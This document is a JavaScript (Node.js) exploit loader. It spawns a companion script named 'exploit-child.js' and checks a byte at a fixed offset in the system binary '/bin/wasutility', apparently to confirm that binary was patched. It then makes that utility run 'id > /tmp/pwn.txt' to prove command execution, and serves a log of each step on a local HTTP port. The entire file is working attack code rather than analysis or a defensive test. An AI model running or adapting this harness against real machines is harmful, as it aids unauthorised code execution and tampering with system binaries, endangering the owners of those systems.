(function() {
  'use strict';
  var fs   = require('fs');
  var http = require('http');
  var cp   = require('child_process');
  var PORT       = 8133;
  var PROBE      = '/home/owner/share/tmp/sdk_tools/tbprobe45h.txt';
  var CHILD_PATH = '/home/owner/share/tmp/sdk_tools/exploit-child.js';
  var PWN_FILE   = '/tmp/pwn.txt';
  var WAS_PATH   = '/bin/wasutility';
  var WAS_OFFSET = 0x7e4b;

  function w(s) { try { fs.appendFileSync(PROBE, s + '\n'); } catch(e) {} }
  try { fs.writeFileSync(PROBE, 'loader:start\n'); } catch(e) {}

  w('loader:execPath=' + process.execPath);
  w('loader:version=' + process.version);

  function serve(body) {
    fs.writeFileSync(PROBE, body);
    var srv = http.createServer(function(req, res) { res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function() {});
    setInterval(function() {}, 60000);
  }

  if (!fs.existsSync(CHILD_PATH)) {
    serve('FAIL:no_exploit_child at ' + CHILD_PATH + '\n=== END ===\n');
    return;
  }

  w('loader:found_child spawning via execFile');

  // Use execFile (no shell) so path issues don't hide the real error
  cp.execFile(process.execPath, [CHILD_PATH], {timeout: 75000}, function(err, stdout, stderr) {
    var code = err ? err.code : 0;
    w('loader:child_done code=' + code);
    w('loader:child_stderr=[' + (stderr || '').slice(0, 500) + ']');
    w('loader:child_stdout=[' + (stdout || '').slice(0, 200) + ']');

    var wasB = -1;
    try { wasB = fs.readFileSync(WAS_PATH)[WAS_OFFSET]; } catch(e) {}
    w('loader:wasByte=0x' + (wasB & 0xff).toString(16));

    var pwn = '';
    try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(e) {}

    if (!pwn) {
      cp.exec(WAS_PATH + ' -e "id > ' + PWN_FILE + '"', {timeout: 8000}, function(e2) {
        try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(re) {}
        var body = fs.readFileSync(PROBE, 'utf8') +
          'loader:exec_e=' + (e2 ? e2.code : 'ok') +
          ' pwn=[' + pwn + ']\n=== END ===\n';
        serve(body);
      });
    } else {
      var body = fs.readFileSync(PROBE, 'utf8') +
        'loader:pwn_already_written pwn=[' + pwn + ']\n=== END ===\n';
      serve(body);
    }
  });
})();
